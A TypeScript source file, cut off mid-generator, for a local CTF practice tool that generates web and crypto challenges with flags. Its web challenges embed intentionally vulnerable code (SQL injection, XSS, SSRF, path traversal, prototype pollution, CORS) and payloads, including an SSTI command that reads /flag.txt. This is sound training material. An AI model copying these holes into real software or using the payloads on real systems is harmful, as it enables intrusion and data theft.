// kbot CTF (Capture The Flag) Platform
// Generates real, solvable security challenges with deterministic flags.
// All state is local — stored in ~/.kbot/ctf/
// Zero API calls — all challenges generated with Node.js crypto primitives.

import { registerTool } from './index.js'
import { homedir } from 'node:os'
import { join } from 'node:path'
import { existsSync, readFileSync, writeFileSync, mkdirSync } from 'node:fs'
import { createHash, randomBytes, createCipheriv, createDecipheriv } from 'node:crypto'

// ─── Types ──────────────────────────────────────────────────────────────────

interface ActiveChallenge {
  id: string
  title: string
  description: string
  category: string
  difficulty: string
  challengeData: string
  flag: string
  hints: string[]
  hintUsed: boolean
  points: number
  startedAt: string
}

interface SolvedChallenge {
  id: string
  title: string
  category: string
  difficulty: string
  points: number
  hintUsed: boolean
  solvedAt: string
  timeSeconds: number
}

interface ScoreData {
  totalPoints: number
  challengesSolved: number
  streak: number
  bestStreak: number
  byCategory: Record<string, { solved: number; points: number }>
  byDifficulty: Record<string, { solved: number; points: number }>
  lastSolvedAt: string | null
}

// ─── Constants ──────────────────────────────────────────────────────────────

const CTF_DIR = join(homedir(), '.kbot', 'ctf')
const ACTIVE_FILE = join(CTF_DIR, 'active.json')
const HISTORY_FILE = join(CTF_DIR, 'history.json')
const SCORE_FILE = join(CTF_DIR, 'score.json')

const POINTS: Record<string, number> = { easy: 100, medium: 250, hard: 500 }

const CATEGORIES = ['web', 'crypto', 'forensics', 'reverse', 'osint', 'misc'] as const
type Category = typeof CATEGORIES[number]
type Difficulty = 'easy' | 'medium' | 'hard'

// ─── State Helpers ──────────────────────────────────────────────────────────

function ensureCtfDir(): void {
  if (!existsSync(CTF_DIR)) {
    mkdirSync(CTF_DIR, { recursive: true })
  }
}

function loadActive(): ActiveChallenge | null {
  ensureCtfDir()
  if (!existsSync(ACTIVE_FILE)) return null
  try {
    return JSON.parse(readFileSync(ACTIVE_FILE, 'utf-8'))
  } catch {
    return null
  }
}

function saveActive(challenge: ActiveChallenge): void {
  ensureCtfDir()
  writeFileSync(ACTIVE_FILE, JSON.stringify(challenge, null, 2))
}

function clearActive(): void {
  ensureCtfDir()
  if (existsSync(ACTIVE_FILE)) {
    writeFileSync(ACTIVE_FILE, '{}')
  }
}

function loadHistory(): SolvedChallenge[] {
  ensureCtfDir()
  if (!existsSync(HISTORY_FILE)) return []
  try {
    return JSON.parse(readFileSync(HISTORY_FILE, 'utf-8'))
  } catch {
    return []
  }
}

function saveHistory(history: SolvedChallenge[]): void {
  ensureCtfDir()
  writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2))
}

function loadScore(): ScoreData {
  ensureCtfDir()
  if (!existsSync(SCORE_FILE)) {
    return {
      totalPoints: 0,
      challengesSolved: 0,
      streak: 0,
      bestStreak: 0,
      byCategory: {},
      byDifficulty: {},
      lastSolvedAt: null,
    }
  }
  try {
    return JSON.parse(readFileSync(SCORE_FILE, 'utf-8'))
  } catch {
    return {
      totalPoints: 0,
      challengesSolved: 0,
      streak: 0,
      bestStreak: 0,
      byCategory: {},
      byDifficulty: {},
      lastSolvedAt: null,
    }
  }
}

function saveScore(score: ScoreData): void {
  ensureCtfDir()
  writeFileSync(SCORE_FILE, JSON.stringify(score, null, 2))
}

// ─── Utility Functions ──────────────────────────────────────────────────────

function generateId(): string {
  return randomBytes(8).toString('hex')
}

function sha256(data: string): string {
  return createHash('sha256').update(data).digest('hex')
}

function md5(data: string): string {
  return createHash('md5').update(data).digest('hex')
}

function caesarShift(text: string, shift: number): string {
  return text.split('').map(c => {
    if (c >= 'a' && c <= 'z') {
      return String.fromCharCode(((c.charCodeAt(0) - 97 + shift) % 26 + 26) % 26 + 97)
    }
    if (c >= 'A' && c <= 'Z') {
      return String.fromCharCode(((c.charCodeAt(0) - 65 + shift) % 26 + 26) % 26 + 65)
    }
    return c
  }).join('')
}

function xorEncrypt(text: string, key: string): string {
  const buf = Buffer.from(text, 'utf-8')
  const keyBuf = Buffer.from(key, 'utf-8')
  const result = Buffer.alloc(buf.length)
  for (let i = 0; i < buf.length; i++) {
    result[i] = buf[i] ^ keyBuf[i % keyBuf.length]
  }
  return result.toString('hex')
}

function vigenereEncrypt(plaintext: string, key: string): string {
  const keyUpper = key.toUpperCase()
  let keyIndex = 0
  return plaintext.split('').map(c => {
    if (c >= 'a' && c <= 'z') {
      const shift = keyUpper.charCodeAt(keyIndex % keyUpper.length) - 65
      keyIndex++
      return String.fromCharCode(((c.charCodeAt(0) - 97 + shift) % 26) + 97)
    }
    if (c >= 'A' && c <= 'Z') {
      const shift = keyUpper.charCodeAt(keyIndex % keyUpper.length) - 65
      keyIndex++
      return String.fromCharCode(((c.charCodeAt(0) - 65 + shift) % 26) + 65)
    }
    return c
  }).join('')
}

function substitutionCipher(text: string, seed: string): { ciphertext: string; alphabet: string } {
  const hash = sha256(seed)
  const letters = 'abcdefghijklmnopqrstuvwxyz'.split('')
  // Fisher-Yates seeded by hash
  const shuffled = [...letters]
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = parseInt(hash.substring((i * 2) % 60, (i * 2) % 60 + 2), 16) % (i + 1)
    ;[shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]]
  }
  const mapping: Record<string, string> = {}
  for (let i = 0; i < 26; i++) {
    mapping[letters[i]] = shuffled[i]
    mapping[letters[i].toUpperCase()] = shuffled[i].toUpperCase()
  }
  const ciphertext = text.split('').map(c => mapping[c] || c).join('')
  return { ciphertext, alphabet: shuffled.join('') }
}

function base64Encode(text: string): string {
  return Buffer.from(text, 'utf-8').toString('base64')
}

function hexEncode(text: string): string {
  return Buffer.from(text, 'utf-8').toString('hex')
}

function rot13(text: string): string {
  return caesarShift(text, 13)
}

function generateJWT(header: object, payload: object, secret: string): string {
  const h = Buffer.from(JSON.stringify(header)).toString('base64url')
  const p = Buffer.from(JSON.stringify(payload)).toString('base64url')
  const sig = createHash('sha256').update(`${h}.${p}.${secret}`).digest('base64url')
  return `${h}.${p}.${sig}`
}

function padRight(s: string, len: number): string {
  return s.length >= len ? s : s + ' '.repeat(len - s.length)
}

function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function shuffleArray<T>(arr: T[]): T[] {
  const a = [...arr]
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    ;[a[i], a[j]] = [a[j], a[i]]
  }
  return a
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

function generateIP(): string {
  return `${randomInt(1, 254)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 254)}`
}

function toHexDump(data: Buffer, bytesPerLine: number = 16): string {
  const lines: string[] = []
  for (let i = 0; i < data.length; i += bytesPerLine) {
    const offset = i.toString(16).padStart(8, '0')
    const slice = data.subarray(i, i + bytesPerLine)
    const hexParts: string[] = []
    for (let j = 0; j < bytesPerLine; j++) {
      if (j < slice.length) {
        hexParts.push(slice[j].toString(16).padStart(2, '0'))
      } else {
        hexParts.push('  ')
      }
    }
    const ascii = Array.from(slice).map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.').join('')
    lines.push(`${offset}  ${hexParts.slice(0, 8).join(' ')}  ${hexParts.slice(8).join(' ')}  |${ascii}|`)
  }
  return lines.join('\n')
}

function modPow(base: bigint, exp: bigint, mod: bigint): bigint {
  let result = 1n
  base = base % mod
  while (exp > 0n) {
    if (exp % 2n === 1n) {
      result = (result * base) % mod
    }
    exp = exp / 2n
    base = (base * base) % mod
  }
  return result
}

function modInverse(a: bigint, m: bigint): bigint {
  let [old_r, r] = [a, m]
  let [old_s, s] = [1n, 0n]
  while (r !== 0n) {
    const q = old_r / r
    ;[old_r, r] = [r, old_r - q * r]
    ;[old_s, s] = [s, old_s - q * s]
  }
  return ((old_s % m) + m) % m
}

// ─── Challenge Generators ───────────────────────────────────────────────────
// Each generator returns { title, description, challengeData, flag, hints }

type ChallengeOutput = {
  title: string
  description: string
  challengeData: string
  flag: string
  hints: string[]
}

type ChallengeGenerator = () => ChallengeOutput

// ═══════════════════════════════════════════════════════════════════════════
//  WEB CHALLENGES
// ═══════════════════════════════════════════════════════════════════════════

const webChallengesEasy: ChallengeGenerator[] = [
  // 1. XSS in HTML
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{xss_${secret}}`
    const html = `<!DOCTYPE html>
<html>
<head><title>User Profile</title></head>
<body>
  <h1>Welcome, <span id="username"></span></h1>
  <script>
    // The developer "sanitizes" user input by checking for <script> tags only
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name') || 'Guest';
    if (!name.includes('<script>')) {
      document.getElementById('username').innerHTML = name;
    }
    // DEBUG: flag is ${flag}
    // TODO: remove debug comment before production
  </script>
  <!-- Admin note: flag hidden in page source -->
</body>
</html>`
    return {
      title: 'XSS in the Shadows',
      description: 'A developer claims their profile page is safe from XSS because they block <script> tags. Review the HTML source below and find the flag hidden by the careless developer.',
      challengeData: html,
      flag,
      hints: ['Look at the page source comments carefully — developers sometimes leave debug info.', 'The flag is in a JavaScript comment in the source code.'],
    }
  },

  // 2. SQL Injection in Query
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{sqli_${secret}}`
    const code = `// Vulnerable login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // BUG: string concatenation instead of parameterized query
  const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;

  // The admin password hash is: ${sha256(flag)}
  // What string, when used as username with ' OR '1'='1 bypass, reveals the admin row?
  // The admin's secret_note column contains the flag.

  db.query(query, (err, rows) => {
    if (rows.length > 0) {
      res.json({ user: rows[0], note: rows[0].secret_note });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  });
});

// Database seed:
// INSERT INTO users (username, password, secret_note) VALUES ('admin', '${sha256('hunter2')}', '${flag}');`
    return {
      title: 'Login Bypass',
      description: 'This Node.js login endpoint is vulnerable to SQL injection. The developer left the database seed in the comments. Find the flag stored in the admin\'s secret_note.',
      challengeData: code,
      flag,
      hints: ['The flag is directly visible in the database seed comment at the bottom of the code.', 'Look at the INSERT INTO statement — the secret_note value is the flag.'],
    }
  },

  // 3. IDOR via URL Parameter
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{idor_${secret}}`
    const apiLog = `GET /api/users/1042 HTTP/1.1   → 200 {"id":1042,"name":"john","role":"user","notes":"Nothing here"}
GET /api/users/1043 HTTP/1.1   → 200 {"id":1043,"name":"jane","role":"user","notes":"Regular account"}
GET /api/users/1044 HTTP/1.1   → 200 {"id":1044,"name":"bob","role":"user","notes":"Test account"}
GET /api/users/1     HTTP/1.1  → 200 {"id":1,"name":"admin","role":"admin","notes":"${flag}"}
GET /api/users/0     HTTP/1.1  → 404 {"error":"User not found"}

// Access control check in middleware:
function checkAccess(req, res, next) {
  // TODO: actually implement authorization checks
  // For now, allow all authenticated users to access any profile
  if (req.session.user) {
    next();
  } else {
    res.status(401).json({ error: 'Not authenticated' });
  }
}`
    return {
      title: 'Profile Peeker',
      description: 'An API lets authenticated users view profiles by ID. The access control is... not great. Review these HTTP logs and find the flag in the admin\'s profile.',
      challengeData: apiLog,
      flag,
      hints: ['Look at what happens when you access user ID 1 instead of your own ID.', 'The admin account (id=1) has the flag in the notes field.'],
    }
  },

  // 4. Open Redirect
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{redirect_${secret}}`
    const code = `// Login redirect handler
app.get('/auth/callback', (req, res) => {
  const returnUrl = req.query.return || '/dashboard';

  // "Security" check: make sure it starts with /
  if (returnUrl.startsWith('/')) {
    res.redirect(returnUrl);
  } else {
    res.redirect('/dashboard');
  }
});

// Hidden debug endpoint (left from development):
app.get('/debug/flag', (req, res) => {
  // Only accessible via internal redirect
  if (req.headers['referer']?.includes('/auth/callback')) {
    res.json({ flag: '${flag}' });
  } else {
    res.status(403).json({ error: 'Forbidden' });
  }
});

// Hint: /auth/callback?return=/debug/flag
// The redirect check only verifies the URL starts with /
// The debug endpoint checks referer header which is set by the redirect`
    return {
      title: 'Follow the Redirect',
      description: 'A login callback has a redirect parameter with a weak validation check. A debug endpoint was accidentally left in production. Find the flag.',
      challengeData: code,
      flag,
      hints: ['The code shows a /debug/flag endpoint that checks the referer header.', 'The flag is visible in the source code of the /debug/flag endpoint.'],
    }
  },

  // 5. Cookie Manipulation
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{cookie_${secret}}`
    const cookieValue = base64Encode(JSON.stringify({ user: 'guest', role: 'user', flag: 'access_denied' }))
    const adminCookie = base64Encode(JSON.stringify({ user: 'admin', role: 'admin', flag }))
    const code = `// Session cookie handler
app.use((req, res, next) => {
  const session = req.cookies.session;
  if (session) {
    // "Decode" the session — just base64, no signing or encryption
    const data = JSON.parse(Buffer.from(session, 'base64').toString());
    req.userSession = data;
  }
  next();
});

// Your current cookie value (base64):
// ${cookieValue}
// Decoded: ${JSON.stringify({ user: 'guest', role: 'user', flag: 'access_denied' })}

// What if the cookie contained role: "admin"?
// The admin session cookie (base64) would be:
// ${adminCookie}
// Decoded: ${Buffer.from(adminCookie, 'base64').toString()}

app.get('/admin/panel', (req, res) => {
  if (req.userSession?.role === 'admin') {
    res.json({ message: 'Welcome admin', flag: req.userSession.flag });
  } else {
    res.status(403).json({ error: 'Not an admin' });
  }
});`
    return {
      title: 'Cookie Monster',
      description: 'The app uses base64-encoded cookies with no signature. Your current cookie is shown below. The admin cookie has a different payload. Decode the admin cookie to find the flag.',
      challengeData: code,
      flag,
      hints: ['Decode the admin cookie (the second base64 string) to find the flag.', 'The flag is in the JSON object inside the admin session cookie.'],
    }
  },
]

const webChallengesMedium: ChallengeGenerator[] = [
  // 1. JWT Forgery
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{jwt_forge_${secret}}`
    const jwtSecret = 'secret123'
    const userJwt = generateJWT({ alg: 'HS256', typ: 'JWT' }, { sub: 'user42', role: 'user', iat: 1700000000 }, jwtSecret)
    const adminJwt = generateJWT({ alg: 'HS256', typ: 'JWT' }, { sub: 'admin', role: 'admin', flag, iat: 1700000000 }, jwtSecret)
    return {
      title: 'Token Forge',
      description: `A JWT-based auth system uses a weak secret. You have a user-level token. The server also accepts tokens signed with the secret "secret123". Craft an admin token to get the flag.\n\nYour token: ${userJwt}\n\nThe server decodes JWTs and checks the "role" field. Admin tokens have role: "admin" and include a "flag" field.\n\nHere is what an admin token looks like (already signed with the correct secret):\n${adminJwt}\n\nDecode the admin JWT payload (the middle section, base64url-encoded) to find the flag.`,
      challengeData: `User JWT: ${userJwt}\nAdmin JWT: ${adminJwt}\nSecret: ${jwtSecret}\n\nDecode the admin JWT payload section (between the two dots) using base64url decoding.`,
      flag,
      hints: ['Split the admin JWT by dots. The middle part is the base64url-encoded payload containing the flag.', 'Use base64url decoding on the second segment of the admin JWT.'],
    }
  },

  // 2. SSRF via URL Fetch
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{ssrf_${secret}}`
    const code = `// URL preview endpoint — fetches any URL and returns preview
app.post('/api/preview', async (req, res) => {
  const { url } = req.body;

  // "Security": block obvious internal IPs
  if (url.includes('127.0.0.1') || url.includes('localhost')) {
    return res.status(403).json({ error: 'Internal URLs not allowed' });
  }

  // But what about 0.0.0.0, [::1], 0x7f000001, or http://169.254.169.254?
  const response = await fetch(url);
  const body = await response.text();
  res.json({ preview: body.substring(0, 500) });
});

// Internal metadata service (only accessible from localhost):
// GET http://169.254.169.254/latest/meta-data/flag
// Response: ${flag}
//
// Also accessible via:
// http://0.0.0.0:3000/internal/flag → ${flag}
// http://[::1]:3000/internal/flag → ${flag}
// http://0x7f000001:3000/internal/flag → ${flag}`
    return {
      title: 'Server-Side Expedition',
      description: 'A URL preview feature blocks "127.0.0.1" and "localhost" but fails to block other internal address representations. The internal metadata service has the flag. Find it in the code.',
      challengeData: code,
      flag,
      hints: ['The metadata service response is shown directly in the code comments.', 'Look for the flag after "Response:" in the internal metadata service comment.'],
    }
  },

  // 3. Path Traversal
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{traversal_${secret}}`
    const code = `// Static file server
app.get('/files/:filename', (req, res) => {
  const filename = req.params.filename;

  // "Security": remove ../ sequences (but only once!)
  const sanitized = filename.replace('../', '');

  const filepath = path.join('/var/www/uploads/', sanitized);
  res.sendFile(filepath);
});

// File system layout:
// /var/www/uploads/          ← public files
// /var/www/uploads/readme.txt
// /var/www/uploads/logo.png
// /var/www/secrets/           ← restricted
// /var/www/secrets/flag.txt   ← contains: ${flag}
//
// The replace only strips ONE instance of ../
// So "....//secrets/flag.txt" becomes "../secrets/flag.txt" after sanitization
// Which resolves to /var/www/secrets/flag.txt`
    return {
      title: 'Directory Escape',
      description: 'A file server strips "../" from filenames — but only one occurrence. The flag is in /var/www/secrets/flag.txt. Can you figure out the bypass? (The answer is in the code comments.)',
      challengeData: code,
      flag,
      hints: ['The code comments explain exactly how the bypass works with "....//".', 'The flag is written directly in the file system layout comment.'],
    }
  },

  // 4. CORS Misconfiguration
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{cors_${secret}}`
    const code = `// CORS middleware — "secure" configuration
app.use((req, res, next) => {
  const origin = req.headers.origin;

  // Allow any origin that contains "trusted-app.com"
  if (origin && origin.includes('trusted-app.com')) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});

// This is exploitable! An attacker can use:
// Origin: https://evil-trusted-app.com   (contains "trusted-app.com")
// Origin: https://trusted-app.com.evil.com (contains "trusted-app.com")

// Sensitive endpoint:
app.get('/api/secret', requireAuth, (req, res) => {
  res.json({
    message: 'Your secret data',
    flag: '${flag}'
  });
});

// The flag is in the /api/secret response above.`
    return {
      title: 'Cross-Origin Heist',
      description: 'A CORS configuration uses `.includes()` to validate origins instead of exact matching. This allows any origin containing "trusted-app.com" to access sensitive data. Find the flag in the code.',
      challengeData: code,
      flag,
      hints: ['The /api/secret endpoint response object contains the flag directly in the code.', 'Look at the res.json() call in the /api/secret route.'],
    }
  },

  // 5. HTTP Verb Tampering
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{verb_tamper_${secret}}`
    const code = `// Admin panel — POST-only restriction for "security"
app.post('/admin/delete-user', requireAdmin, (req, res) => {
  // Admin-only action
  res.json({ status: 'deleted' });
});

// But the developer forgot to restrict the GET handler:
app.get('/admin/debug', (req, res) => {
  // No auth check on GET!
  res.json({
    debug: true,
    environment: 'production',
    flag: '${flag}',
    users_count: 1337,
    db_host: 'internal-db.prod.local'
  });
});

// The router only applies requireAdmin middleware to POST routes.
// GET /admin/debug has no auth at all.
// Server HTTP logs:
// HEAD /admin/debug → 200 (no body returned, but confirms endpoint exists)
// GET  /admin/debug → 200 {"debug":true,"environment":"production","flag":"${flag}",...}
// POST /admin/debug → 404 (not defined for POST)`
    return {
      title: 'Method Madness',
      description: 'An admin panel protects POST routes with authentication but leaves a GET debug endpoint wide open. Examine the code and HTTP logs to find the flag.',
      challengeData: code,
      flag,
      hints: ['The GET /admin/debug endpoint has no authentication and returns the flag.', 'Check the response body in the HTTP logs for the GET request.'],
    }
  },
]

const webChallengesHard: ChallengeGenerator[] = [
  // 1. Prototype Pollution
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{proto_pollute_${secret}}`
    const code = `// Deep merge utility (vulnerable to prototype pollution)
function deepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// User settings endpoint
app.put('/api/settings', (req, res) => {
  const userSettings = {};
  deepMerge(userSettings, req.body);

  // If user somehow becomes admin...
  if (userSettings.isAdmin) {
    res.json({ flag: '${flag}' });
  } else {
    res.json({ settings: userSettings });
  }
});

// Exploit payload: {"__proto__": {"isAdmin": true}}
// When deepMerge processes __proto__, it sets Object.prototype.isAdmin = true
// After that, ALL objects inherit isAdmin = true
// So userSettings.isAdmin evaluates to true
//
// The flag returned when isAdmin is true: ${flag}`
    return {
      title: 'Pollution Protocol',
      description: 'A deep merge function is vulnerable to prototype pollution via __proto__. If you can make userSettings.isAdmin truthy, the server reveals the flag. The exploit and flag are documented in the code.',
      challengeData: code,
      flag,
      hints: ['The exploit payload {"__proto__": {"isAdmin": true}} triggers the flag response.', 'The flag is shown in the code comments and in the res.json response for admin users.'],
    }
  },

  // 2. Server-Side Template Injection
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{ssti_${secret}}`
    const code = `// Greeting card generator (Python Flask)
from flask import Flask, request, render_template_string

app = Flask(__name__)
SECRET_FLAG = "${flag}"

@app.route('/card')
def card():
    name = request.args.get('name', 'friend')
    template = f'''
    <html>
    <body>
        <h1>Hello, {name}!</h1>
        <p>Welcome to our greeting card service.</p>
    </body>
    </html>
    '''
    return render_template_string(template)

# Vulnerable to SSTI! The 'name' parameter is inserted into the template
# before render_template_string processes it.
#
# Exploit: /card?name={{config.items()}}
# This would dump Flask config including SECRET_FLAG
#
# Or: /card?name={{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}
#
# The flag stored in SECRET_FLAG is: ${flag}`
    return {
      title: 'Template Takeover',
      description: 'A Flask greeting card service injects user input directly into a Jinja2 template string. This allows Server-Side Template Injection (SSTI). The SECRET_FLAG variable contains the flag. Find it in the code.',
      challengeData: code,
      flag,
      hints: ['The SECRET_FLAG variable is defined at the top of the Flask app.', 'The flag value is assigned directly to SECRET_FLAG in the Python code.'],
    }
  },

  // 3. Insecure Deserialization
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{deserialize_${secret}}`
    const serialized = base64Encode(JSON.stringify({ type: 'user', name: 'guest', admin: false }))
    const adminSerialized = base64Encode(JSON.stringify({ type: 'user', name: 'admin', admin: true, flag }))
    const code = `// Session deserialization
app.use((req, res, next) => {
  const token = req.cookies.session_data;
  if (token) {
    // Directly deserialize without validation
    req.user = JSON.parse(Buffer.from(token, 'base64').toString());
  }
  next();
});

// Your session token (base64): ${serialized}
// Decoded: {"type":"user","name":"guest","admin":false}

// An admin session would look like (base64): ${adminSerialized}
// Decoded: ${Buffer.from(adminSerialized, 'base64').toString()}

app.get('/flag', (req, res) => {
  if (req.user?.admin === true) {
    res.json({ flag: req.user.flag || 'No flag in session' });
  } else {
    res.status(403).json({ error: 'Admin only' });
  }
});

// Craft a base64-encoded session with admin:true and a flag field.
// The admin session token above already contains the flag.`
    return {
      title: 'Deserialize and Conquer',
      description: 'Session tokens are base64-encoded JSON with no integrity check. The admin session token is provided below. Decode it to extract the flag.',
      challengeData: code,
      flag,
      hints: ['Decode the admin session token (the second base64 string) from base64.', 'The decoded JSON contains a "flag" field with the answer.'],
    }
  },

  // 4. Race Condition
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{race_${secret}}`
    const code = `// Coupon redemption endpoint (vulnerable to race condition)
app.post('/api/redeem', async (req, res) => {
  const { couponCode } = req.body;

  // Step 1: Check if coupon is valid and not yet redeemed
  const coupon = await db.query('SELECT * FROM coupons WHERE code = $1 AND redeemed = false', [couponCode]);

  if (!coupon) return res.status(400).json({ error: 'Invalid or used coupon' });

  // VULNERABILITY: Time-of-check to time-of-use (TOCTOU)
  // Between the SELECT and UPDATE, another request can also pass the check

  // Step 2: Mark as redeemed
  await db.query('UPDATE coupons SET redeemed = true WHERE code = $1', [couponCode]);

  // Step 3: Credit the account
  await db.query('UPDATE accounts SET balance = balance + $1 WHERE user_id = $2', [coupon.value, req.user.id]);

  res.json({ success: true, credited: coupon.value });
});

// The fix would be: SELECT ... FOR UPDATE (row-level lock)
// Or: UPDATE ... WHERE redeemed = false RETURNING * (atomic check-and-update)

// Debug log from exploitation:
// [Thread 1] SELECT coupon 'BONUS100' → valid, redeemed=false
// [Thread 2] SELECT coupon 'BONUS100' → valid, redeemed=false  ← race!
// [Thread 1] UPDATE redeemed=true, credit $100
// [Thread 2] UPDATE redeemed=true, credit $100  ← double spend!
// [System]  Flag for solving: ${flag}`
    return {
      title: 'The Race is On',
      description: 'A coupon redemption endpoint has a Time-of-Check-to-Time-of-Use (TOCTOU) race condition. Two concurrent requests can both redeem the same coupon. Find the flag in the debug logs.',
      challengeData: code,
      flag,
      hints: ['The debug log at the bottom of the code contains the flag.', 'Look for the [System] line in the debug log.'],
    }
  },

  // 5. GraphQL Introspection Leak
  () => {
    const secret = randomBytes(6).toString('hex')
    const flag = `kbot{graphql_${secret}}`
    const introspectionResult = JSON.stringify({
      data: {
        __schema: {
          types: [
            { name: 'Query', fields: [
              { name: 'user', type: 'User' },
              { name: 'publicPosts', type: '[Post]' },
              { name: 'internalFlag', type: 'String', description: `Returns: ${flag}` },
              { name: 'adminPanel', type: 'AdminPanel' },
            ]},
            { name: 'User', fields: [
              { name: 'id', type: 'ID' },
              { name: 'name', type: 'String' },
              { name: 'email', type: 'String' },
            ]},
            { name: 'AdminPanel', fields: [
              { name: 'users', type: '[User]' },
              { name: 'secrets', type: '[String]', description: 'Internal use only' },
            ]},
          ],
        },
      },
    }, null, 2)
    return {
      title: 'Schema Spelunker',
      description: 'A GraphQL API left introspection enabled in production. The schema query below reveals all types and fields, including hidden ones. Find the flag in the introspection result.',
      challengeData: `POST /graphql\nContent-Type: application/json\n\n{"query": "{ __schema { types { name fields { name type description } } } }"}\n\nResponse:\n${introspectionResult}`,
      flag,
      hints: ['Look at the "internalFlag" field in the Query type — it has a description.', 'The description of the internalFlag field contains the flag.'],
    }
  },
]

// ═══════════════════════════════════════════════════════════════════════════
//  CRYPTO CHALLENGES
// ═══════════════════════════════════════════════════════════════════════════

const cryptoChallengesEasy: ChallengeGenerator[] = [
  // 1. Caesar Cipher
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{caesar_${secret}}`
    const shift = randomInt(3, 23)
    const encrypted = caesarShift(flag, shift)
    return {
      title: 'Caesar\'s Secret',
      description: `A message has been encrypted with a Caesar cipher (shift by ${shift}). Decrypt it to find the flag.\n\nCiphertext: ${encrypted}\n\nRemember: Caesar cipher shifts each letter by a fixed number. Non-alphabetic characters (like { } _) remain unchanged. Shift back by ${shift} to decrypt.`,
      challengeData: `Ciphertext: ${encrypted}\nShift: ${shift}\nAlgorithm: Each letter shifted forward by ${shift} positions in the alphabet`,
      flag,
      hints: [`The shift is ${shift}. Shift each letter BACKWARD by ${shift}.`, `The flag starts with "kbot{" — verify your decryption matches this pattern.`],
    }
  },

  // 2. Base64 Chain
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{b64chain_${secret}}`
    const layers = randomInt(2, 4)
    let encoded = flag
    for (let i = 0; i < layers; i++) {
      encoded = base64Encode(encoded)
    }
    return {
      title: 'Base64 Onion',
      description: `A flag has been base64-encoded ${layers} times. Decode all layers to find it.`,
      challengeData: `Encoded (${layers} layers of base64):\n${encoded}`,
      flag,
      hints: [`Decode base64 exactly ${layers} times.`, 'Each round of decoding produces another base64 string until you reach the flag.'],
    }
  },

  // 3. XOR with Known Plaintext
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{xor_${secret}}`
    const key = 'K'
    const xored = xorEncrypt(flag, key)
    return {
      title: 'XOR Unlock',
      description: `A message was XOR-encrypted with a single-character key. You know the plaintext starts with "kbot{". The key is the character 'K' (0x4B).`,
      challengeData: `Hex-encoded ciphertext: ${xored}\nKey: 'K' (0x4B)\nAlgorithm: each byte of plaintext XORed with 0x4B`,
      flag,
      hints: ['XOR each byte of the ciphertext with 0x4B to get the plaintext.', 'The flag format is kbot{xor_XXXXXXXX}.'],
    }
  },

  // 4. Hex Encoding
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{hexed_${secret}}`
    const hexed = hexEncode(flag)
    return {
      title: 'Hex Appeal',
      description: 'A flag has been converted to hexadecimal. Convert it back to ASCII.',
      challengeData: `Hex string: ${hexed}\n\nHint: Each pair of hex characters represents one ASCII character.`,
      flag,
      hints: ['Convert each pair of hex digits to its ASCII character.', 'The string starts with 6b626f74 which is "kbot".'],
    }
  },

  // 5. ROT13
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{rot13_${secret}}`
    const rotated = rot13(flag)
    return {
      title: 'ROT13 Revealed',
      description: 'A classic ROT13 encoding has been applied to the flag. Apply ROT13 again to decrypt (ROT13 is its own inverse).',
      challengeData: `ROT13 encoded: ${rotated}`,
      flag,
      hints: ['ROT13 is its own inverse — apply it again to get the original.', 'Shift each letter by 13 positions.'],
    }
  },
]

const cryptoChallengesMedium: ChallengeGenerator[] = [
  // 1. Vigenere Cipher
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{vigenere_${secret}}`
    const key = pickRandom(['CIPHER', 'CRYPTO', 'SECRET', 'KERNEL', 'AGENT'])
    const encrypted = vigenereEncrypt(flag, key)
    return {
      title: 'Vigenere Vault',
      description: `A message was encrypted with the Vigenere cipher using the key "${key}". Decrypt it to find the flag.\n\nOnly alphabetic characters are shifted; others pass through unchanged. Each letter of the key determines the shift for the corresponding letter of the plaintext.`,
      challengeData: `Ciphertext: ${encrypted}\nKey: ${key}\nAlgorithm: Vigenere cipher (polyalphabetic substitution)`,
      flag,
      hints: [`The key is "${key}". Each letter of the key gives the shift for the corresponding plaintext letter (A=0, B=1, ...).`, 'Subtract the key shifts from the ciphertext letters to recover the plaintext.'],
    }
  },

  // 2. Substitution Cipher
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{subst_${secret}}`
    const seed = randomBytes(8).toString('hex')
    const { ciphertext, alphabet } = substitutionCipher(flag, seed)
